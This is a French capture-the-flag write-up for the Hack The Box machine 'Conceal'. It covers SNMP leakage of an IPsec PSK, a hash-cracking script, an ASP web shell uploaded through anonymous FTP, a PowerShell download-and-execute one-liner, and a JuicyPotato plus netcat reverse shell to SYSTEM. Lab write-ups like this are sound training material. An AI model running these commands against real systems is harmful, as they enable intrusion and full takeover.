# Conceal writeups by Seyptoo

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/5/1558114549-capture-du-2019-05-17-19-35-32.png)](https://image.noelshack.com/fichiers/2019/20/5/1558114549-capture-du-2019-05-17-19-35-32.png)

Informations
----
    Ip :  10.10.10.116  Created by : bashlogic
    Level : Hard        Base Points : 40

Résumé : <br />

La boîte Conceal était une boîte assez intéressante et très amusante, le niveau était assez simple, juste une bonne énumération était amplement suffisante. Et j'ai beaucoup appris de chose dans cette fameuse boîte. <br />

- Il y a le port SNMP qui est ouvert, et il a été mis en public concrètement, et nous trouvons une adresse PSK. <br />
- Et ensuite nous devons cracker l'adresse PSK. <br />
- Une bonne configuration pour avoir accès, avec le protocole IPSEC avec le programme StrongSwan. <br />
- Nous devons créer un point de routage avec IPSEC pour rediriger les ports et d'accéder à la machine. <br />
- On peut upload des fichiers dans le FTP, et ensuite d'exécuter le script dans la page web et faire son reverse shell. <br />
- Pour l'accès root, il y a une vulnérabilité Windows assez récente, la faille ALPC.

Source : <br />

- https://www.zdnet.fr/actualites/la-faille-windows-alpc-deja-exploitee-39873227.htm <br />
- https://wiki.strongswan.org/projects/strongswan/wiki/UserDocumentation

Nmap Scan
----
Donc il y a aucun port ouvert visiblement donc va voir pour l'UDP et de chercher des ports qui peuvent être très intéressant pour l'énumération.

    root@Seyptoo:~/htb/box/Conceal# nmap -sC -sV -oA nmap/check 10.10.10.116

    Starting Nmap 7.01 ( https://nmap.org ) at 2019-05-17 19:53 CEST
    Nmap scan report for 10.10.10.116
    Host is up (0.036s latency).
    All 1000 scanned ports on 10.10.10.116 are filtered

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 39.80 seconds
    
Pour le UDP je vais utiliser le programme 'masscan'.

    root@Seyptoo:~/htb/box/Conceal# masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0

    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2019-05-17 18:03:26 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 1 hosts [131070 ports/host]
    Discovered open port 161/udp on 10.10.10.116                                   

Donc comme vous pouvez le voir il y a le port 161/UDP qui est ouvert nous cela correspond au protocole SNMP, donc essayons d'énumérer ça avec Nmap et de voir les informations nécessaires.

    root@Seyptoo:~/htb/box/Conceal# nmap -sU -sC -sV -p161 10.10.10.116

    Starting Nmap 7.01 ( https://nmap.org ) at 2019-05-17 20:11 CEST
    Nmap scan report for 10.10.10.116
    Host is up (0.051s latency).
    PORT    STATE SERVICE VERSION
    161/udp open  snmp    SNMPv1 server (public)
    [...SNIP...]

SNMP Enumeration
----
Donc nous allons essayer d'exécuter le programme snmpwalk et d'énumérer le service en question.

    root@Seyptoo:~/htb/box/Conceal# snmpwalk -c public -v 1 10.10.10.116
    [...SNIP...]
    iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
    iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
    [...SNIP...]
    
Comme vous pouvez le voir il y a une adresse PSK, cette adresse va nous permettre beaucoup de choses, tout d'abord essayons de cracker le hash, donc le hash est du NTLM. Donc j'ai créé un script en Python pour cracker le hash en question.

    #coding:utf-8

    import sys
    import hashlib
    import binascii
    import threading
    import Queue
    import time

    class NTLM(threading.Thread):
        def __init__(self, system_threads=30):
            threading.Thread.__init__(self)
            self.threads = system_threads
            # Calling Thread variable.
            try:
                # We will test the arguments.
                # To handle incorrect errors.

                self.LIST = sys.argv[1]
                self.NTLM = sys.argv[2]

                # I create an exception for the error.
                # For the use of the program.
            except IndexError as e:
                sys.exit(e)

        def NTLModel(self, q):
            """
            This function will handle the attack.

            Parameters
            ----
                self : The self parameter is used to manage the supervariables
                q : It's the wordlist for bruteforce hash NTLM.

            Return
            ----
            Be he will return the password or nothing.
            """
            while True:
                qet = q.get()
                if(self.NTLM.islower() == False):
                    self.NTLM = self.NTLM.lower()

                HASH = hashlib.new('md4', qet.encode('utf-16le')).digest()
                # The attack will be launched at that moment.
                if(binascii.hexlify(HASH) == self.NTLM):
                    print "\n[+] NTLM : %s:%s\n" %(self.NTLM, qet), sys.exit(0)
                else:
                    print "[-] ERROR NTLM/1000 : %s:%s" %(self.NTLM, qet)

        def run(self):
            """
            This function will handle
            the thread system to speed up the
            program and the list.
            """
            if(self.LIST):
                q = Queue.Queue()
                with open(self.LIST, "r") as files:
                    for online in files:
                        q.put(online.rstrip("\n\r"))
                    self.NTLModel(q)	

                for i in range(int(self.threads)):
                    wrapper = threading.Thread(target=self.NTLModel, args=(i, q))
                    wrapper.setDaemon(True)
                    wrapper.start()
                    wrapper.join(600)

                q.join()
		

	if __name__ == "__main__":
		NTLM().start()


Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter et le programme va cracker le hash, si vous souhaitez bruteforce le mot de passe ça va prendre un bon moment. Je vous conseille d'aller sur CrackStation.

	root@Seyptoo:~/htb/box/Conceal# python NTLM.py /usr/share/wordlist/rockyou.txt 9C8B1A372B1878851BE2C097031B6E43
	[-] ERROR NTLM/1000 : 9c8b1a372b1878851be2c097031b6e43:azerty
	[...SNIP...]

	[+] NTLM : 9c8b1a372b1878851be2c097031b6e43:Dudecake1!

Après un bon moment de bruteforce, il a enfin trouvé le mot de passe, mais je ne recommande pas d'utiliser le programme ça va prendre énormément de temps. Allez plutôt sur CrackStation.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)

IPSEC Configuration
----
Donc nous arrivons dans la partie la plus intéressante de la machine car c'est un moment où j'ai pris énormément de temps mais également de souffrance, j'ai pris vraiment beaucoup de temps. <br />

IPsec (Internet Protocol Security), défini par l'IETF comme un cadre de standards ouverts pour assurer des communications privées et protégées sur des réseaux IP, par l'utilisation des services de sécurité cryptographiques, est un ensemble de protocoles utilisant des algorithmes permettant le transport de données sécurisées sur un réseau IP. <br />

Donc nous allons modifier le fichier **/etc/ipsec.secrets** et enfin le fichier **/etc/ipsec.conf**, donc regardez les configurations ci-dessous. <br /><br />
Fichier : ipsec.conf

	config setup
	    charondebug="all" 

	conn conceal
	    keyexchange=ikev1
	    ike=3des-sha1-modp1024
	    esp=3des-sha1
	    leftid=Destitute
	    left=10.10.14.179
	    leftsubnet=10.10.14.0/24
	    leftauth=psk
	    rightid=%any
	    right=10.10.10.116
	    rightsubnet=10.10.10.116[tcp/%any]
	    rightauth=psk
	    auto=add
	    type=transport
	    ikelifetime=28800
	    keylife=28800
	    fragmentation=yes
	    keyingtries=1

N'oubliez surtout pas de modifier l'adresse IP de l'interface tun0 dans le leftsubnet et dans le left, pour que il y a aucun problème au niveau de l'exécution. <br /><br />
Fichier : ipsec.secrets

	# ipsec.secrets - strongSwan IPsec secrets file

	%any %any : PSK "Dudecake1!"

Je ne vais pas vous expliquer en détail le fonctionnement des lignes, car sinon ça va être très très long. Il y a déjà la documentation qui nous montre le fonctionnement. Donc pour lancer la configuration et de tester si la connexion marche avec succès lancée la commande juste ci-dessous.

	root@Seyptoo:~/htb/box/Conceal# ipsec up conceal
	generating QUICK_MODE request 3539874152 [ HASH SA No ID ID ]
	sending packet: from 10.10.15.229[500] to 10.10.10.116[500] (196 bytes)
	received packet: from 10.10.10.116[500] to 10.10.15.229[500] (212 bytes)
	parsed QUICK_MODE response 3539874152 [ HASH SA No ID ID N((24576)) ]
	selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
	detected rekeying of CHILD_SA conceal{1}
	CHILD_SA conceal{2} established with SPIs c8dc7342_i dde379e8_o and TS 10.10.15.229/32 === 10.10.10.116/32[tcp]
	connection 'conceal' established successfully

La connexion a été established avec succès donc c'est parfait donc maintenant nous allons créés un point de routage, nous allons rediriger les ports vers notre réseau pour accéder aux ports filtrés de la machine, je vous ai faits un petit schéma ci-dessous pour que vous compreniez le système.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)

Donc pour rediriger les ports filtrés vers notre machine vous devez simplement taper la commande ci-dessous et vous allez voir que la redirection se fait très simplement.

	root@Seyptoo:~/htb/box/Conceal# ipsec route conceal
	'conceal' routed
	
Donc si on refait un scan de port TCP nous allons voir que il y'a des service ouvert dans la machine.
	
	root@Seyptoo:~/htb/box/Conceal# nmap -sT -p1-65535 10.10.10.116 --min-rate 1000
	Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-18 11:44 CEST
	Nmap scan report for 10.10.10.116
	Host is up (0.039s latency).
	Not shown: 65523 closed ports
	PORT      STATE SERVICE
	21/tcp    open  ftp
	80/tcp    open  http
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	
	Nmap done: 1 IP address (1 host up) scanned in 79.67 seconds
	root@Seyptoo:~/htb/box/Conceal# nmap -sT -sC -sV -p21,80,135,139,445 10.10.10.116                                                                                 
	Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-18 11:50 CEST
	Nmap scan report for 10.10.10.116
	Host is up (0.036s latency).

	PORT    STATE SERVICE       VERSION
	21/tcp  open  ftp           Microsoft ftpd
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| ftp-syst:
	|_  SYST: Windows_NT
	80/tcp  open  http          Microsoft IIS httpd 10.0
	| http-methods:
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows
	135/tcp open  msrpc         Microsoft Windows RPC
	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds?
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

	Host script results:
	| smb2-security-mode:
	|   2.02:
	|_    Message signing enabled but not required
	| smb2-time:
	|   date: 2019-05-18 11:50:58
	|_  start_date: 2019-05-18 06:32:33

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                         
	Nmap done: 1 IP address (1 host up) scanned in 23.56 seconds

Nous avons des informations très intéressantes, on peut voir qu'on peut se connecter en tant que Anonymous dans le FTP et on peut également upload des fichiers.
	
HTTP
----
Donc si nous allons dans le serveur HTTP, il y'a pas grand chose donc pour ça je vais lancer une attaque gobuster pour voir si il y'a des dossiers intéréssant ou des fichiers.

	root@Seyptoo:~/htb/box/Conceal# gobuster -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.116
	/upload (Status: 301)

Donc le site web accepte seulement de l'asp ou bien du aspx, mais il accepte en aucun cas du PHP. Donc pour ça je vais upload un shell ASP WebShell pour IIS 8 dans le serveur pour envoyer des commandes. Un bon lien pour télécharger le shell. https://packetstormsecurity.com/files/137024/ASP-Webshell-For-IIS-8.html <br />

	root@Seyptoo:~/htb/box/Conceal# ftp 10.10.10.116
	Connected to 10.10.10.116.
	220 Microsoft FTP Service
	Name (10.10.10.116:seyptoo): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password:
	230 User logged in.
	Remote system type is Windows_NT.
	ftp> mput index.asp
	mput index.asp? y
	200 PORT command successful.
	125 Data connection already open; Transfer starting.
	226 Transfer complete.
	1423 bytes sent in 0.00 secs (17.8563 MB/s)
	ftp> 

Donc après avoir upload le shell nous pouvons exécuter des commandes depuis curl.

	root@Seyptoo:~/htb/box/Conceal# curl http://10.10.10.116/upload/index.asp -d "cmd=whoami"
	[...SNIP...]
	conceal\destitute
	[...SNIP..]
	
Parfait nous sommes prêt pour le reverse shell nous allons utiliser metasploit le module web_delivery pour effectué notre reverse shell avec sans aucun problème.

	msf > use exploit/multi/script/web_delivery
	msf exploit(multi/script/web_delivery) > set LHOST 10.10.15.229
	msf exploit(multi/script/web_delivery) > set LPORT 9001
	msf exploit(multi/script/web_delivery) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
	msf exploit(multi/script/web_delivery) > set TARGET 4
	
Donc le code fournis en powershell il faut le mettre depuis le site web et non depuis curl car il y a des problèmes d'encodage etc.. Donc je vous conseille vivement d'aller sur le chemin directement. Le code fourni par Metasploit.

	powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\DF95KsPU.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.15.229:8080/mSErF4WvPeAoECb', $z); invoke-item $z
	
Après avoir exécuté le code powershell nous avons un shell, mais le problème nous sommes pas administrator.

	msf exploit(multi/script/web_delivery) > exploit
	[*] 10.10.10.116     web_delivery - Delivering Payload                                                
	[*] Sending stage (206403 bytes) to 10.10.10.116
	[*] Meterpreter session 1 opened (10.10.15.229:4444 -> 10.10.10.116:49675) at 2019-05-18 13:50:59 +0200

	meterpreter > shell
	Process 1564 created.
	Channel 1 created.
	Microsoft Windows [Version 10.0.15063]
	(c) 2017 Microsoft Corporation. All rights reserved.
	
	C:\Windows\SysWOW64\inetsrv> whoami
	conceal\destitute

PrivEsc
----
Le privesc n'est pas très compliqué sur la machine nous allons taper la commande ci-dessous. En exécutant whoami /priv, nous voyons que les droits de l'utilisateur nous permettront d'utiliser l'exploit RottenPotato pour s'élever à NTAUTORITY/SYSTEM. 
C:\Windows\SysWOW64\inetsrv>whoami /priv

	
	C:\Users\Windows\System32>whoami /priv

	PRIVILEGES INFORMATION
	----------------------

	Privilege Name                Description                               State   
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
	SeShutdownPrivilege           Shut down the system                      Disabled
	SeAuditPrivilege              Generate security audits                  Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
	SeUndockPrivilege             Remove computer from docking station      Disabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
	SeTimeZonePrivilege           Change the time zone                      Disabled

Nous devons choisir le CLSID approprié pour notre système d'exploitation. Nous allons d'abord vérifier quelle version de Windows est en cours d'exécution actuellement : 

	C:\inetpub\wwwroot\upload>systeminfo
	
	Host Name:                 CONCEAL
	OS Name:                   Microsoft Windows 10 Enterprise
	OS Version:                10.0.15063 N/A Build 15063
	
Ensuite, nous vérifions sur le site https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md la liste des CLSID pour le système d'exploitation. <br />

Nous allons utiliser {5BC7A3A1-E905-414B-9790-E511346F5CA6}, sans aucune raison particulière, puis exécuter JuicyPotato et exécuter un autre netcat pour générer un nouveau shell inversé pour nous.

	C:\inetpub\wwwroot\upload>juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.39 9001" -t * -c {5BC7A3A1-E905-414B-9790-E511346F5CA6}
	[...SNIP...]
	[+] CreateProcessWithTokenW OK
	
Et ensuite on a juste à faire le reverse shell depuis notre machine physique pour être administrateur.

	root@Seyptoo:~/htb/box/Conceal# nc -lvnp 9001
	listening on [any] 9001 ...
	connect to [10.10.14.39] from (UNKNOWN) [10.10.10.116] 45135
	Microsoft Windows [Version 10.0.15063]
	(c) 2017 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	nt authority\system
